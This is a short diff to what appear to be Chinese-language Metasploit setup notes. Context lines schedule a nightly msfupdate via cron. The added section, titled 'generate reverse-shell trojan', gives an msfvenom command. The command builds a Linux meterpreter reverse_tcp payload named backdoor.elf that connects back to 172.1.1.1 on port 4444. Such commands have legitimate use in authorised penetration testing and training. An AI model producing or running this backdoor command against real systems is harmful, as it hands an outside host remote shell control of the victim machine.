@@ -24,3 +24,10 @@ git config --global user.email "email@example.com"
 crontab -e
 0 1 * * * /root/metasploit-framework/msfupdate > /dev/null 2>&1
 ```
+
+
+
+生成反弹木马
+```
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.1.1.1 LPORT=4444 -f elf -o backdoor.elf
+```
